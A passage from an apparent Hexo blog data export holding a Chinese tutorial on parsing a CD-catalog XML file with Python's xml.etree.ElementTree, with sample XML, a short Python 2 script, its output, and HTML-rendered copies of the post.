records</COMPANY>\n\t\t<PRICE>10.20</PRICE>\n\t\t<YEAR>1990</YEAR>\n\t</CD>\n\t<CD>\n\t\t<TITLE>Eros</TITLE>\n\t\t<ARTIST>Eros Ramazzotti</ARTIST>\n\t\t<COUNTRY>EU</COUNTRY>\n\t\t<COMPANY>BMG</COMPANY>\n\t\t<PRICE>9.90</PRICE>\n\t\t<YEAR>1997</YEAR>\n\t</CD>\n</CATALOG>\n```\n\n### 2. 代码\n``` python\n#!/usr/bin/env python\n\nimport json\n\ntry:\n    import xml.etree.cElementTree as ET\nexcept ImportError:\n    print 'no c version Element Tree'\n    import xml.etree.ElementTree as ET\n\n\ndef parse_xml():\n    properties = {};\n\n    tree = ET.parse(\"cd.xml\");\n    docs = tree.getroot();\n\n    print_all_artist(docs);\n    print_all_cd_name_and_price(docs);\n\n\ndef print_all_artist(docs):\n    print '----------------------------'\n    for doc in docs.iter(\"ARTIST\"):\n        print doc.text\n\n\ndef print_all_cd_name_and_price(docs):\n    print '----------------------------'\n    for doc in docs:\n        line = ''\n        for field in doc:\n            if field.tag == 'TITLE':\n                line = line + field.text + \"\\t\"\n\n            if field.tag == 'PRICE':\n                line = line + field.text + \"\\t\"\n\n        print line\n\n\nif __name__ == '__main__':\n    parse_xml();\n```\n\n### 3. 运行结果\n``` bash\nyerba-buena:~ yeshaoting$ python parse_cd_xml.py\n----------------------------\nBob Dylan\nBonnie Tyler\nDolly Parton\nGary Moore\nEros Ramazzotti\n----------------------------\nEmpire Burlesque\t10.90\nHide your heart\t9.90\nGreatest Hits\t9.90\nStill got the blues\t10.20\nEros\t9.90\n```\n\n\n## 四、参考文档\n- [深入解读Python解析XML的几种方式](http://codingpy.com/article/parsing-xml-using-python/)\n- [Python 标准库之 xml.etree.ElementTree](http://www.cnblogs.com/ifantastic/archive/2013/04/12/3017110.html)\n- [Python XML解析](http://www.runoob.com/python/python-xml.html)","slug":"article/python/xml.etree.ElementTree解析xml","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxv0007b5nbtrguqycrn","content":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\"></p>\n<p>本文将介绍如何使用python基本类库xml.etree.ElementTree解析xml文档。</p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><h3 id=\"1-xml解析支持\"><a href=\"#1-xml解析支持\" class=\"headerlink\" title=\"1. xml解析支持\"></a>1. xml解析支持</h3><p>python标准库提供三种方法解析XML: SAX、DOM以及ElementTree。</p>\n<h4 id=\"SAX-simple-API-for-XML\"><a href=\"#SAX-simple-API-for-XML\" class=\"headerlink\" title=\"SAX (simple API for XML )\"></a>SAX (simple API for XML )</h4><p>python 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。</p>\n<h4 id=\"DOM-Document-Object-Model\"><a href=\"#DOM-Document-Object-Model\" class=\"headerlink\" title=\"DOM(Document Object Model)\"></a>DOM(Document Object Model)</h4><p>将XML数据在内存中解析成一个树，通过对树的操作来操作XML。</p>\n<h4 id=\"ElementTree-元素树\"><a href=\"#ElementTree-元素树\" class=\"headerlink\" title=\"ElementTree(元素树)\"></a>ElementTree(元素树)</h4><p>ElementTree就像一个轻量级的DOM，具有方便友好的API。代码可用性好，速度快，消耗内存少。</p>\n<h3 id=\"2-ElementTree介绍\"><a href=\"#2-ElementTree介绍\" class=\"headerlink\" title=\"2. ElementTree介绍\"></a>2. ElementTree介绍</h3><p>xml.etree.ElementTree模块提供了一个轻量级、Pythonic的API，同时还有一个高效的C语言实现，即xml.etree.cElementTree。<br>与DOM相比，ET的速度更快，API使用更直接、方便。<br>与SAX相比，ET.iterparse函数同样提供了按需解析的功能，不会一次性在内存中读入整个文档。ET的性能与SAX模块大致相仿，但是它的API更加高层次，用户使用起来更加便捷。<br>因此，使用python解析xml时，推荐使用ElementTree这种方式。</p>\n<a id=\"more\"></a>\n<h2 id=\"二、ElementTree详解\"><a href=\"#二、ElementTree详解\" class=\"headerlink\" title=\"二、ElementTree详解\"></a>二、ElementTree详解</h2><h3 id=\"1-类库加载\"><a href=\"#1-类库加载\" class=\"headerlink\" title=\"1. 类库加载\"></a>1. 类库加载</h3><p>xml.etree.ElementTree有两种实现方式:纯python实现的xml.etree.ElementTree 和 C实现的xml.etree.cElementTree.<br>C语言实现的版本，性能更加。如当前python版本包含了C语言实现的版本，优先使用。</p>\n<p>为了兼容旧版本的python，在加载xml.etree.ElementTree时，可以通过如下方式加载类库:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">try:</div><div class=\"line\">    import xml.etree.cElementTree as ET</div><div class=\"line\">except ImportError:</div><div class=\"line\">    import xml.etree.ElementTree as ET</div></pre></td></tr></table></figure></p>\n<h3 id=\"2-xml-etree-ElementTree对象\"><a href=\"#2-xml-etree-ElementTree对象\" class=\"headerlink\" title=\"2. xml.etree.ElementTree对象\"></a>2. xml.etree.ElementTree对象</h3><p>xml.etree.ElementTree提供了两类对象：ElementTree对象和Element对象。<br>ElementTree将整个XML文档转化为树，对整个XML文档的交互（读取，写入，查找需要的元素），一般是在ElementTree层面进行的。<br>Element则代表着树上的单个节点，对单个XML元素及其子元素，则是在Element层面进行的。</p>\n<h3 id=\"3-ElementTree对象\"><a href=\"#3-ElementTree对象\" class=\"headerlink\" title=\"3. ElementTree对象\"></a>3. ElementTree对象</h3><h4 id=\"解析xml\"><a href=\"#解析xml\" class=\"headerlink\" title=\"解析xml\"></a>解析xml</h4><p><strong>解析xml文件</strong><br>tree = ET.parse(“cd.xml”);</p>\n<p><strong>解析xml字符串</strong><br>tree = ET.fromstring(cd_data_as_string)</p>\n<p><strong>注</strong>:获得的tree变量即是一个ElementTree对象。</p>\n<h4 id=\"常用方法\"><a href=\"#常用方法\" class=\"headerlink\" title=\"常用方法\"></a>常用方法</h4><p>getroot():获取根节点。<br>iter(tag=None):遍历当前元素及所有子元素。</p>\n<h3 id=\"4-Element对象\"><a href=\"#4-Element对象\" class=\"headerlink\" title=\"4. Element对象\"></a>4. Element对象</h3><h4 id=\"对象属性\"><a href=\"#对象属性\" class=\"headerlink\" title=\"对象属性\"></a>对象属性</h4><p>每个Element对象都具有以下属性：</p>\n<ul>\n<li>tag：string对象，表示数据代表的种类。</li>\n<li>attrib：dictionary对象，表示附有的属性。</li>\n<li>text：string对象，表示element的内容。</li>\n<li>tail：string对象，表示element闭合之后的尾迹。</li>\n<li>若干子元素（child elements）。</li>\n</ul>\n<h4 id=\"常用方法-1\"><a href=\"#常用方法-1\" class=\"headerlink\" title=\"常用方法\"></a>常用方法</h4><p>iter(tag=None)：生成遍历当前元素所有后代或者给定tag的后代的迭代器。(python2.7新特性)<br>get(key, default=None)：获取key对应的属性值，如该属性不存在则返回default值。<br>items()：根据属性字典返回一个列表，列表元素为(key, value）。<br>keys()：返回包含所有元素属性键的列表。</p>\n<h2 id=\"三、解析实例\"><a href=\"#三、解析实例\" class=\"headerlink\" title=\"三、解析实例\"></a>三、解析实例</h2><p>打印所有<strong>艺术家</strong>的名字、打印所有CD名称及对应的售价。</p>\n<h3 id=\"1-实例文档\"><a href=\"#1-实例文档\" class=\"headerlink\" title=\"1. 实例文档\"></a>1. 实例文档</h3><p>实例使用到的XML实例文件cd.xml内容如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;</div><div class=\"line\"><span class=\"comment\">&lt;!-- Edited with XML Spy v2007 (http://www.altova.com) --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">CATALOG</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">TITLE</span>&gt;</span>Empire Burlesque<span class=\"tag\">&lt;/<span class=\"name\">TITLE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">ARTIST</span>&gt;</span>Bob Dylan<span class=\"tag\">&lt;/<span class=\"name\">ARTIST</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COUNTRY</span>&gt;</span>USA<span class=\"tag\">&lt;/<span class=\"name\">COUNTRY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COMPANY</span>&gt;</span>Columbia<span class=\"tag\">&lt;/<span class=\"name\">COMPANY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">PRICE</span>&gt;</span>10.90<span class=\"tag\">&lt;/<span class=\"name\">PRICE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">YEAR</span>&gt;</span>1985<span class=\"tag\">&lt;/<span class=\"name\">YEAR</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">TITLE</span>&gt;</span>Hide your heart<span class=\"tag\">&lt;/<span class=\"name\">TITLE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">ARTIST</span>&gt;</span>Bonnie Tyler<span class=\"tag\">&lt;/<span class=\"name\">ARTIST</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COUNTRY</span>&gt;</span>UK<span class=\"tag\">&lt;/<span class=\"name\">COUNTRY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COMPANY</span>&gt;</span>CBS Records<span class=\"tag\">&lt;/<span class=\"name\">COMPANY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">PRICE</span>&gt;</span>9.90<span class=\"tag\">&lt;/<span class=\"name\">PRICE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">YEAR</span>&gt;</span>1988<span class=\"tag\">&lt;/<span class=\"name\">YEAR</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">TITLE</span>&gt;</span>Greatest Hits<span class=\"tag\">&lt;/<span class=\"name\">TITLE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">ARTIST</span>&gt;</span>Dolly Parton<span class=\"tag\">&lt;/<span class=\"name\">ARTIST</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COUNTRY</span>&gt;</span>USA<span class=\"tag\">&lt;/<span class=\"name\">COUNTRY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COMPANY</span>&gt;</span>RCA<span class=\"tag\">&lt;/<span class=\"name\">COMPANY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">PRICE</span>&gt;</span>9.90<span class=\"tag\">&lt;/<span class=\"name\">PRICE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">YEAR</span>&gt;</span>1982<span class=\"tag\">&lt;/<span class=\"name\">YEAR</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">TITLE</span>&gt;</span>Still got the blues<span class=\"tag\">&lt;/<span class=\"name\">TITLE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">ARTIST</span>&gt;</span>Gary Moore<span class=\"tag\">&lt;/<span class=\"name\">ARTIST</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COUNTRY</span>&gt;</span>UK<span class=\"tag\">&lt;/<span class=\"name\">COUNTRY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COMPANY</span>&gt;</span>Virgin records<span class=\"tag\">&lt;/<span class=\"name\">COMPANY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">PRICE</span>&gt;</span>10.20<span class=\"tag\">&lt;/<span class=\"name\">PRICE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">YEAR</span>&gt;</span>1990<span class=\"tag\">&lt;/<span class=\"name\">YEAR</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">TITLE</span>&gt;</span>Eros<span class=\"tag\">&lt;/<span class=\"name\">TITLE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">ARTIST</span>&gt;</span>Eros Ramazzotti<span class=\"tag\">&lt;/<span class=\"name\">ARTIST</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COUNTRY</span>&gt;</span>EU<span class=\"tag\">&lt;/<span class=\"name\">COUNTRY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COMPANY</span>&gt;</span>BMG<span class=\"tag\">&lt;/<span class=\"name\">COMPANY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">PRICE</span>&gt;</span>9.90<span class=\"tag\">&lt;/<span class=\"name\">PRICE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">YEAR</span>&gt;</span>1997<span class=\"tag\">&lt;/<span class=\"name\">YEAR</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">CATALOG</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"2-代码\"><a href=\"#2-代码\" class=\"headerlink\" title=\"2. 代码\"></a>2. 代码</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> json</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">try</span>:</div><div class=\"line\">    <span class=\"keyword\">import</span> xml.etree.cElementTree <span class=\"keyword\">as</span> ET</div><div class=\"line\"><span class=\"keyword\">except</span> ImportError:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'no c version Element Tree'</span></div><div class=\"line\">    <span class=\"keyword\">import</span> xml.etree.ElementTree <span class=\"keyword\">as</span> ET</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">parse_xml</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    properties = &#123;&#125;;</div><div class=\"line\"></div><div class=\"line\">    tree = ET.parse(<span class=\"string\">\"cd.xml\"</span>);</div><div class=\"line\">    docs = tree.getroot();</div><div class=\"line\"></div><div class=\"line\">    print_all_artist(docs);</div><div class=\"line\">    print_all_cd_name_and_price(docs);</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">print_all_artist</span><span class=\"params\">(docs)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'----------------------------'</span></div><div class=\"line\">    <span class=\"keyword\">for</span> doc <span class=\"keyword\">in</span> docs.iter(<span class=\"string\">\"ARTIST\"</span>):</div><div class=\"line\">        <span class=\"keyword\">print</span> doc.text</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">print_all_cd_name_and_price</span><span class=\"params\">(docs)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">'----------------------------'</span></div><div class=\"line\">    <span class=\"keyword\">for</span> doc <span class=\"keyword\">in</span> docs:</div><div class=\"line\">        line = <span class=\"string\">''</span></div><div class=\"line\">        <span class=\"keyword\">for</span> field <span class=\"keyword\">in</span> doc:</div><div class=\"line\">            <span class=\"keyword\">if</span> field.tag == <span class=\"string\">'TITLE'</span>:</div><div class=\"line\">                line = line + field.text + <span class=\"string\">\"\\t\"</span></div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">if</span> field.tag == <span class=\"string\">'PRICE'</span>:</div><div class=\"line\">                line = line + field.text + <span class=\"string\">\"\\t\"</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">print</span> line</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    parse_xml();</div></pre></td></tr></table></figure>\n<h3 id=\"3-运行结果\"><a href=\"#3-运行结果\" class=\"headerlink\" title=\"3. 运行结果\"></a>3. 运行结果</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div></pre></td><td class=\"code\"><pre><div class=\"line\">yerba-buena:~ yeshaoting$ python parse_<span class=\"built_in\">cd</span>_xml.py</div><div class=\"line\">----------------------------</div><div class=\"line\">Bob Dylan</div><div class=\"line\">Bonnie Tyler</div><div class=\"line\">Dolly Parton</div><div class=\"line\">Gary Moore</div><div class=\"line\">Eros Ramazzotti</div><div class=\"line\">----------------------------</div><div class=\"line\">Empire Burlesque\t10.90</div><div class=\"line\">Hide your heart\t9.90</div><div class=\"line\">Greatest Hits\t9.90</div><div class=\"line\">Still got the blues\t10.20</div><div class=\"line\">Eros\t9.90</div></pre></td></tr></table></figure>\n<h2 id=\"四、参考文档\"><a href=\"#四、参考文档\" class=\"headerlink\" title=\"四、参考文档\"></a>四、参考文档</h2><ul>\n<li><a href=\"http://codingpy.com/article/parsing-xml-using-python/\" target=\"_blank\" rel=\"external\">深入解读Python解析XML的几种方式</a></li>\n<li><a href=\"http://www.cnblogs.com/ifantastic/archive/2013/04/12/3017110.html\" target=\"_blank\" rel=\"external\">Python 标准库之 xml.etree.ElementTree</a></li>\n<li><a href=\"http://www.runoob.com/python/python-xml.html\" target=\"_blank\" rel=\"external\">Python XML解析</a></li>\n</ul>\n","excerpt":"<p><img src=\"/asserts/images/logo/python.png\" class=\"img-logo img-center\" /></p>\n<p>本文将介绍如何使用python基本类库xml.etree.ElementTree解析xml文档。</p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><h3 id=\"1-xml解析支持\"><a href=\"#1-xml解析支持\" class=\"headerlink\" title=\"1. xml解析支持\"></a>1. xml解析支持</h3><p>python标准库提供三种方法解析XML: SAX、DOM以及ElementTree。</p>\n<h4 id=\"SAX-simple-API-for-XML\"><a href=\"#SAX-simple-API-for-XML\" class=\"headerlink\" title=\"SAX (simple API for XML )\"></a>SAX (simple API for XML )</h4><p>python 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。</p>\n<h4 id=\"DOM-Document-Object-Model\"><a href=\"#DOM-Document-Object-Model\" class=\"headerlink\" title=\"DOM(Document Object Model)\"></a>DOM(Document Object Model)</h4><p>将XML数据在内存中解析成一个树，通过对树的操作来操作XML。</p>\n<h4 id=\"ElementTree-元素树\"><a href=\"#ElementTree-元素树\" class=\"headerlink\" title=\"ElementTree(元素树)\"></a>ElementTree(元素树)</h4><p>ElementTree就像一个轻量级的DOM，具有方便友好的API。代码可用性好，速度快，消耗内存少。</p>\n<h3 id=\"2-ElementTree介绍\"><a href=\"#2-ElementTree介绍\" class=\"headerlink\" title=\"2. ElementTree介绍\"></a>2. ElementTree介绍</h3><p>xml.etree.ElementTree模块提供了一个轻量级、Pythonic的API，同时还有一个高效的C语言实现，即xml.etree.cElementTree。<br>与DOM相比，ET的速度更快，API使用更直接、方便。<br>与SAX相比，ET.iterparse函数同样提供了按需解析的功能，不会一次性在内存中读入整个文档。ET的性能与SAX模块大致相仿，但是它的API更加高层次，用户使用起来更加便捷。<br>因此，使用python解析xml时，推荐使用ElementTree这种方式。</p>","more":"<h2 id=\"二、ElementTree详解\"><a href=\"#二、ElementTree详解\" class=\"headerlink\" title=\"二、ElementTree详解\"></a>二、ElementTree详解</h2><h3 id=\"1-类库加载\"><a href=\"#1-类库加载\" class=\"headerlink\" title=\"1. 类库加载\"></a>1. 类库加载</h3><p>xml.etree.ElementTree有两种实现方式:纯python实现的xml.etree.ElementTree 和 C实现的xml.etree.cElementTree.<br>C语言实现的版本，性能更加。如当前python版本包含了C语言实现的版本，优先使用。</p>\n<p>为了兼容旧版本的python，在加载xml.etree.ElementTree时，可以通过如下方式加载类库:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">try:</div><div class=\"line\">    import xml.etree.cElementTree as ET</div><div class=\"line\">except ImportError:</div><div class=\"line\">    import xml.etree.ElementTree as ET</div></pre></td></tr></table></figure></p>\n<h3 id=\"2-xml-etree-ElementTree对象\"><a href=\"#2-xml-etree-ElementTree对象\" class=\"headerlink\" title=\"2. xml.etree.ElementTree对象\"></a>2. xml.etree.ElementTree对象</h3><p>xml.etree.ElementTree提供了两类对象：ElementTree对象和Element对象。<br>ElementTree将整个XML文档转化为树，对整个XML文档的交互（读取，写入，查找需要的元素），一般是在ElementTree层面进行的。<br>Element则代表着树上的单个节点，对单个XML元素及其子元素，则是在Element层面进行的。</p>\n<h3 id=\"3-ElementTree对象\"><a href=\"#3-ElementTree对象\" class=\"headerlink\" title=\"3. ElementTree对象\"></a>3. ElementTree对象</h3><h4 id=\"解析xml\"><a href=\"#解析xml\" class=\"headerlink\" title=\"解析xml\"></a>解析xml</h4><p><strong>解析xml文件</strong><br>tree = ET.parse(“cd.xml”);</p>\n<p><strong>解析xml字符串</strong><br>tree = ET.fromstring(cd_data_as_string)</p>\n<p><strong>注</strong>:获得的tree变量即是一个ElementTree对象。</p>\n<h4 id=\"常用方法\"><a href=\"#常用方法\" class=\"headerlink\" title=\"常用方法\"></a>常用方法</h4><p>getroot():获取根节点。<br>iter(tag=None):遍历当前元素及所有子元素。</p>\n<h3 id=\"4-Element对象\"><a href=\"#4-Element对象\" class=\"headerlink\" title=\"4. Element对象\"></a>4. Element对象</h3><h4 id=\"对象属性\"><a href=\"#对象属性\" class=\"headerlink\" title=\"对象属性\"></a>对象属性</h4><p>每个Element对象都具有以下属性：</p>\n<ul>\n<li>tag：string对象，表示数据代表的种类。</li>\n<li>attrib：dictionary对象，表示附有的属性。</li>\n<li>text：string对象，表示element的内容。</li>\n<li>tail：string对象，表示element闭合之后的尾迹。</li>\n<li>若干子元素（child elements）。</li>\n</ul>\n<h4 id=\"常用方法-1\"><a href=\"#常用方法-1\" class=\"headerlink\" title=\"常用方法\"></a>常用方法</h4><p>iter(tag=None)：生成遍历当前元素所有后代或者给定tag的后代的迭代器。(python2.7新特性)<br>get(key, default=None)：获取key对应的属性值，如该属性不存在则返回default值。<br>items()：根据属性字典返回一个列表，列表元素为(key, value）。<br>keys()：返回包含所有元素属性键的列表。</p>\n<h2 id=\"三、解析实例\"><a href=\"#三、解析实例\" class=\"headerlink\" title=\"三、解析实例\"></a>三、解析实例</h2><p>打印所有<strong>艺术家</strong>的名字、打印所有CD名称及对应的售价。</p>\n<h3 id=\"1-实例文档\"><a href=\"#1-实例文档\" class=\"headerlink\" title=\"1. 实例文档\"></a>1. 实例文档</h3><p>实例使用到的XML实例文件cd.xml内容如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;</div><div class=\"line\"><span class=\"comment\">&lt;!-- Edited with XML Spy v2007 (http://www.altova.com) --&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">CATALOG</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">TITLE</span>&gt;</span>Empire Burlesque<span class=\"tag\">&lt;/<span class=\"name\">TITLE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">ARTIST</span>&gt;</span>Bob Dylan<span class=\"tag\">&lt;/<span class=\"name\">ARTIST</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COUNTRY</span>&gt;</span>USA<span class=\"tag\">&lt;/<span class=\"name\">COUNTRY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">COMPANY</span>&gt;</span>Columbia<span class=\"tag\">&lt;/<span class=\"name\">COMPANY</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">PRICE</span>&gt;</span>10.90<span class=\"tag\">&lt;/<span class=\"name\">PRICE</span>&gt;</span></div><div class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">YEAR</span>&gt;</span>1985<span class=\"tag\">&lt;/<span class=\"name\">YEAR</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">CD</span>&gt;</span></div><div class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">CD</span>&gt;</span></div><div 